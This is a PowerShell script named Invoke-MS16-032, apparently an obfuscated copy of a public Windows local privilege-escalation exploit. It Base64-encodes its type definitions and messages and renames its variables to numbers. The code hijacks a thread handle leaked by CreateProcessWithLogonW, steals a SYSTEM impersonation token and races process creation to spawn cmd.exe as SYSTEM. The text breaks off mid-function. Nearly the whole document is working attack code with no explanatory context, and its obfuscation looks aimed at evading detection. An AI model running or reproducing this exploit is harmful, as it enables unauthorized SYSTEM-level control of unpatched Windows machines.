function Invoke-MS16-032 {
	Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoACQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsADsADQAKAAkADQAKAAkAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAAUABSAE8AQwBFAFMAUwBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgANAAoACQB7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgAUAByAG8AYwBlAHMAcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgAVABoAHIAZQBhAGQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIABkAHcAUAByAG8AYwBlAHMAcwBJAGQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIABkAHcAVABoAHIAZQBhAGQASQBkADsADQAKAAkAfQANAAoACQANAAoACQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALAAgAEMAaABhAHIAUwBlAHQAPQBDAGgAYQByAFMAZQB0AC4AVQBuAGkAYwBvAGQAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAFMAVABBAFIAVABVAFAASQBOAEYATwANAAoACQB7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdAAzADIAIABjAGIAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABsAHAAUgBlAHMAZQByAHYAZQBkADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABwAEQAZQBzAGsAdABvAHAAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABsAHAAVABpAHQAbABlADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0ADMAMgAgAGQAdwBYADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0ADMAMgAgAGQAdwBZADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0ADMAMgAgAGQAdwBYAFMAaQB6AGUAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAMwAyACAAZAB3AFkAUwBpAHoAZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdAAzADIAIABkAHcAWABDAG8AdQBuAHQAQwBoAGEAcgBzADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0ADMAMgAgAGQAdwBZAEMAbwB1AG4AdABDAGgAYQByAHMAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAMwAyACAAZAB3AEYAaQBsAGwAQQB0AHQAcgBpAGIAdQB0AGUAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAMwAyACAAZAB3AEYAbABhAGcAcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdAAxADYAIAB3AFMAaABvAHcAVwBpAG4AZABvAHcAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAMQA2ACAAYwBiAFIAZQBzAGUAcgB2AGUAZAAyADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABwAFIAZQBzAGUAcgB2AGUAZAAyADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAaABTAHQAZABJAG4AcAB1AHQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAFMAdABkAE8AdQB0AHAAdQB0ADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAaABTAHQAZABFAHIAcgBvAHIAOwANAAoACQB9AA0ACgAJAA0ACgAJAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAFMAUQBPAFMADQAKAAkAewANAAoACQAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIABMAGUAbgBnAHQAaAA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABpAG4AdAAgAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwBvAG4AdABlAHgAdABUAHIAYQBjAGsAaQBuAGcATQBvAGQAZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABiAG8AbwBsACAARQBmAGYAZQBjAHQAaQB2AGUATwBuAGwAeQA7AA0ACgAJAH0ADQAKAAkADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGMAbABhAHMAcwAgAEEAZAB2AGEAcABpADMAMgANAAoACQB7AA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABMAG8AZwBvAG4AVwAoAA0ACgAJAAkACQBTAHQAcgBpAG4AZwAgAHUAcwBlAHIATgBhAG0AZQAsAA0ACgAJAAkACQBTAHQAcgBpAG4AZwAgAGQAbwBtAGEAaQBuACwADQAKAAkACQAJAFMAdAByAGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACwADQAKAAkACQAJAGkAbgB0ACAAbABvAGcAbwBuAEYAbABhAGcAcwAsAA0ACgAJAAkACQBTAHQAcgBpAG4AZwAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgBOAGEAbQBlACwADQAKAAkACQAJAFMAdAByAGkAbgBnACAAYwBvAG0AbQBhAG4AZABMAGkAbgBlACwADQAKAAkACQAJAGkAbgB0ACAAYwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAsAA0ACgAJAAkACQBpAG4AdAAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAAsAA0ACgAJAAkACQBTAHQAcgBpAG4AZwAgAGMAdQByAHIAZQBuAHQARABpAHIAZQBjAHQAbwByAHkALAANAAoACQAJAAkAcgBlAGYAIAAgAFMAVABBAFIAVABVAFAASQBOAEYATwAgAHMAdABhAHIAdAB1AHAASQBuAGYAbwAsAA0ACgAJAAkACQBvAHUAdAAgAFAAUgBPAEMARQBTAFMAXwBJAE4ARgBPAFIATQBBAFQASQBPAE4AIABwAHIAbwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgApADsADQAKAAkACQAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AKAANAAoACQAJAAkAcgBlAGYAIABJAG4AdABQAHQAcgAgAFQAaAByAGUAYQBkACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAVABvAGsAZQBuACkAOwANAAoACQAJAAkADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAE8AcABlAG4AVABoAHIAZQBhAGQAVABvAGsAZQBuACgADQAKAAkACQAJAEkAbgB0AFAAdAByACAAVABoAHIAZQBhAGQASABhAG4AZABsAGUALAANAAoACQAJAAkAaQBuAHQAIABEAGUAcwBpAHIAZQBkAEEAYwBjAGUAcwBzACwADQAKAAkACQAJAGIAbwBvAGwAIABPAHAAZQBuAEEAcwBTAGUAbABmACwADQAKAAkACQAJAG8AdQB0ACAASQBuAHQAUAB0AHIAIABUAG8AawBlAG4ASABhAG4AZABsAGUAKQA7AA0ACgAJAAkACQANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAFAAcgBvAGMAZQBzAHMASABhAG4AZABsAGUALAAgAA0ACgAJAAkACQBpAG4AdAAgAEQAZQBzAGkAcgBlAGQAQQBjAGMAZQBzAHMALAANAAoACQAJAAkAcgBlAGYAIABJAG4AdABQAHQAcgAgAFQAbwBrAGUAbgBIAGEAbgBkAGwAZQApADsADQAKAAkACQAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAZQB4AHQAZQByAG4AIABzAHQAYQB0AGkAYwAgAGIAbwBvAGwAIABEAHUAcABsAGkAYwBhAHQAZQBUAG8AawBlAG4AKAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABFAHgAaQBzAHQAaQBuAGcAVABvAGsAZQBuAEgAYQBuAGQAbABlACwADQAKAAkACQAJAGkAbgB0ACAAUwBFAEMAVQBSAEkAVABZAF8ASQBNAFAARQBSAFMATwBOAEEAVABJAE8ATgBfAEwARQBWAEUATAAsAA0ACgAJAAkACQByAGUAZgAgAEkAbgB0AFAAdAByACAARAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEgAYQBuAGQAbABlACkAOwANAAoACQB9AA0ACgAJAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABLAGUAcgBuAGUAbAAzADIADQAKAAkAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAdQBpAG4AdAAgAEcAZQB0AEwAYQBzAHQARQByAHIAbwByACgAKQA7AA0ACgAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAQwB1AHIAcgBlAG4AdABQAHIAbwBjAGUAcwBzACgAKQA7AA0ACgAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAQwB1AHIAcgBlAG4AdABUAGgAcgBlAGEAZAAoACkAOwANAAoACQAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQAVABoAHIAZQBhAGQASQBkACgASQBuAHQAUAB0AHIAIABoAFQAaAByAGUAYQBkACkAOwANAAoACQAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABpAG4AdAAgAEcAZQB0AFAAcgBvAGMAZQBzAHMASQBkAE8AZgBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAaABhAG4AZABsAGUAKQA7AA0ACgAJAAkADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAAUwB1AHMAcABlAG4AZABUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAaABUAGgAcgBlAGEAZAApADsADQAKAAkACQANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABSAGUAcwB1AG0AZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAaABUAGgAcgBlAGEAZAApADsADQAKAAkACQANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVABlAHIAbQBpAG4AYQB0AGUAUAByAG8AYwBlAHMAcwAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAUAByAG8AYwBlAHMAcwAsAA0ACgAJAAkACQB1AGkAbgB0ACAAdQBFAHgAaQB0AEMAbwBkAGUAKQA7AA0ACgAJAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABDAGwAbwBzAGUASABhAG4AZABsAGUAKABJAG4AdABQAHQAcgAgAGgATwBiAGoAZQBjAHQAKQA7AA0ACgAJAAkADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEQAdQBwAGwAaQBjAGEAdABlAEgAYQBuAGQAbABlACgADQAKAAkACQAJAEkAbgB0AFAAdAByACAAaABTAG8AdQByAGMAZQBQAHIAbwBjAGUAcwBzAEgAYQBuAGQAbABlACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAaABTAG8AdQByAGMAZQBIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAVABhAHIAZwBlAHQAUAByAG8AYwBlAHMAcwBIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQByAGUAZgAgAEkAbgB0AFAAdAByACAAbABwAFQAYQByAGcAZQB0AEgAYQBuAGQAbABlACwADQAKAAkACQAJAGkAbgB0ACAAZAB3AEQAZQBzAGkAcgBlAGQAQQBjAGMAZQBzAHMALAANAAoACQAJAAkAYgBvAG8AbAAgAGIASQBuAGgAZQByAGkAdABIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQBpAG4AdAAgAGQAdwBPAHAAdABpAG8AbgBzACkAOwANAAoACQB9AA0ACgAJAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABOAHQAZABsAGwADQAKAAkAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAG4AdABkAGwAbAAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABpAG4AdAAgAE4AdABJAG0AcABlAHIAcwBvAG4AYQB0AGUAVABoAHIAZQBhAGQAKAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABUAGgAcgBlAGEAZABIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAFQAaAByAGUAYQBkAFQAbwBJAG0AcABlAHIAcwBvAG4AYQB0AGUALAANAAoACQAJAAkAcgBlAGYAIABTAFEATwBTACAAUwBlAGMAdQByAGkAdAB5AFEAdQBhAGwAaQB0AHkATwBmAFMAZQByAHYAaQBjAGUAKQA7AA0ACgAJAH0A')))
	function f2 {
		${6} = New-Object STARTUPINFO
		${6}.dwFlags = 0x00000100 
		${6}.hStdInput = [Kernel32]::GetCurrentThread()
		${6}.hStdOutput = [Kernel32]::GetCurrentThread()
		${6}.hStdError = [Kernel32]::GetCurrentThread()
		${6}.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(${6}) 
		${3} = New-Object PROCESS_INFORMATION
		${7} = (gi -Path ".\" -Verbose).FullName
		${4} = [Advapi32]::CreateProcessWithLogonW(
			$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABvAG0AYQBpAG4A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))),
			0x00000002, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUA'))), "",
			0x00000004, $null, ${7},
			[ref]${6}, [ref]${3})
		${15} = [IntPtr]::Zero
		${4} = [Kernel32]::DuplicateHandle(
			${3}.hProcess, 0x4,
			[Kernel32]::GetCurrentProcess(),
			[ref]${15}, 0, $false,
			0x00000002)
		${4} = [Kernel32]::TerminateProcess(${3}.hProcess, 1)
		${4} = [Kernel32]::CloseHandle(${3}.hProcess)
		${4} = [Kernel32]::CloseHandle(${3}.hThread)
		${15}
	}
	function f1 {
		echo "`n[?] Thread belongs to: $($(ps -PID $([Kernel32]::GetProcessIdOfThread(${10}))).ProcessName)"
		${4} = [Kernel32]::SuspendThread(${10})
		if (${4} -ne 0) {
			echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMQAwAH0AIABpAHMAIABhACAAYgBhAGQAIAB0AGgAcgBlAGEAZAAsACAAZQB4AGkAdABpAG4AZwAuAC4A')))
			Return
		} echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGgAcgBlAGEAZAAgAHMAdQBzAHAAZQBuAGQAZQBkAA==')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA+AF0AIABXAGkAcABpAG4AZwAgAGMAdQByAHIAZQBuAHQAIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAdABvAGsAZQBuAA==')))
		${4} = [Advapi32]::SetThreadToken([ref]${10}, [IntPtr]::Zero)
		if (!${4}) {
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIABmAGEAaQBsAGUAZAAsACAAZQB4AGkAdABpAG4AZwAuAC4A')))
			${4} = [Kernel32]::ResumeThread(${10})
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGgAcgBlAGEAZAAgAHIAZQBzAHUAbQBlAGQAIQA=')))
			Return
		}
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA+AF0AIABCAHUAaQBsAGQAaQBuAGcAIABTAFkAUwBUAEUATQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIAB0AG8AawBlAG4A')))
		${14} = New-Object SQOS
		${14}.ImpersonationLevel = 2 
		${14}.Length = [System.Runtime.InteropServices.Marshal]::SizeOf(${14})
		${4} = [Ntdll]::NtImpersonateThread(${10}, ${10}, [ref]${14})
		if (${4} -ne 0) {
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAHQASQBtAHAAZQByAHMAbwBuAGEAdABlAFQAaAByAGUAYQBkACAAZgBhAGkAbABlAGQALAAgAGUAeABpAHQAaQBuAGcALgAuAA==')))
			${4} = [Kernel32]::ResumeThread(${10})
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGgAcgBlAGEAZAAgAHIAZQBzAHUAbQBlAGQAIQA=')))
			Return
		}
		${script:12} = [IntPtr]::Zero
		${4} = [Advapi32]::OpenThreadToken(${10}, 0x0006, $false, [ref]${12})
		if (!${4}) {
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgAGYAYQBpAGwAZQBkACwAIABlAHgAaQB0AGkAbgBnAC4ALgA=')))
			${4} = [Kernel32]::ResumeThread(${10})
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGgAcgBlAGEAZAAgAHIAZQBzAHUAbQBlAGQAIQA=')))
			Return
		}
		echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABTAHUAYwBjAGUAcwBzACwAIABvAHAAZQBuACAAUwBZAFMAVABFAE0AIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA6ACAAJAB7ADEAMgB9AA==')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAcwB1AG0AaQBuAGcAIAB0AGgAcgBlAGEAZAAuAC4A')))
		${4} = [Kernel32]::ResumeThread(${10})
	}
	${13} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAgAF8AXwAgAF8AXwAgAF8AXwBfACAAXwBfAF8AIAAgACAAXwBfAF8AIAAgACAAIAAgAF8AXwBfACAAXwBfAF8AIABfAF8AXwAgAA0ACgAJAHwAIAAgAFYAIAAgAHwAIAAgAF8AfABfACAAIAB8ACAAfAAgACAAXwB8AF8AXwBfAHwAIAAgACAAfABfACAAIAB8AF8AIAAgAHwADQAKAAkAfAAgACAAIAAgACAAfABfACAAIAB8AF8AfAAgAHwAXwB8ACAALgAgAHwAXwBfAF8AfAAgAHwAIAB8AF8AIAAgAHwAIAAgAF8AfAANAAoACQB8AF8AfABfAHwAXwB8AF8AXwBfAHwAXwBfAF8AXwBfAHwAXwBfAF8AfAAgACAAIAB8AF8AXwBfAHwAXwBfAF8AfABfAF8AXwB8AA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAYgB5ACAAYgAzADMAZgAgAC0APgAgAEAARgB1AHoAegB5AFMAZQBjAF0A')))
	${13}
	echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
	if ($([System.Environment]::ProcessorCount) -lt 2) {
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABUAGgAaQBzACAAaQBzACAAYQAgAFYATQAgAGkAcwBuACcAdAAgAGkAdAAsACAAcgBhAGMAZQAgAGMAbwBuAGQAaQB0AGkAbwBuACAAcgBlAHEAdQBpAHIAZQBzACAAYQB0ACAAbABlAGEAcwB0ACAAMgAgAEMAUABVACAAYwBvAHIAZQBzACwAIABlAHgAaQB0AGkAbgBnACEACgA=')))
		Return
	}
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA+AF0AIABEAHUAcABsAGkAYwBhAHQAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgATABvAGcAbwBuAFcAIABoAGEAbgBkAGwAZQA=')))
	${10} = f2
	if (${10} -eq 0) {
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB2AGEAbABpAGQAIAB0AGgAcgBlAGEAZAAgAGgAYQBuAGQAbABlACAAdwBhAHMAIABjAGEAcAB0AHUAcgBlAGQALAAgAGUAeABpAHQAaQBuAGcAIQAKAA==')))
		Return
	} else {
		echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABEAG8AbgBlACwAIAB1AHMAaQBuAGcAIAB0AGgAcgBlAGEAZAAgAGgAYQBuAGQAbABlADoAIAAkAHsAMQAwAH0A')))
	} echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACoAXQAgAFMAbgBpAGYAZgBpAG4AZwAgAG8AdQB0ACAAcAByAGkAdgBpAGwAZQBnAGUAZAAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIAB0AG8AawBlAG4ALgAuAA==')))
	f1
	if (${12} -eq 0) {
		Return
	}
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACoAXQAgAFMAbgBpAGYAZgBpAG4AZwAgAG8AdQB0ACAAUwBZAFMAVABFAE0AIABzAGgAZQBsAGwALgAuAA==')))
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbAD4AXQAgAEQAdQBwAGwAaQBjAGEAdABpAG4AZwAgAFMAWQBTAFQARQBNACAAdABvAGsAZQBuAA==')))
	${9} = [IntPtr]::Zero
	${4} = [Advapi32]::DuplicateToken(${12}, 2, [ref]${9})
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA+AF0AIABTAHQAYQByAHQAaQBuAGcAIAB0AG8AawBlAG4AIAByAGEAYwBlAA==')))
	${11} = [runspacefactory]::CreateRunspace()
	${2} = [powershell]::Create()
	${2}.runspace = ${11}
	${11}.Open()
	[void]${2}.AddScript({
		Param (${10}, ${9})
		while ($true) {
			${4} = [Advapi32]::SetThreadToken([ref]${10}, ${9})
		}
	}).AddArgument(${10}).AddArgument(${9})
	${8} = ${2}.BeginInvoke()
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA+AF0AIABTAHQAYQByAHQAaQBuAGcAIABwAHIAbwBjAGUAcwBzACAAcgBhAGMAZQA=')))
	${1} = [diagnostics.stopwatch]::StartNew()
	while (${1}.ElapsedMilliseconds -lt 10000) {
		${6} = New-Object STARTUPINFO
		${6}.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(${6}) 
		${3} = New-Object PROCESS_INFORMATION
		${7} = (gi -Path ".\" -Verbose).FullName
		${4} = [Advapi32]::CreateProcessWithLogonW(
			$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABvAG0AYQBpAG4A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))),
			0x00000002, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUA'))), "",
			0x00000004, $null, ${7},
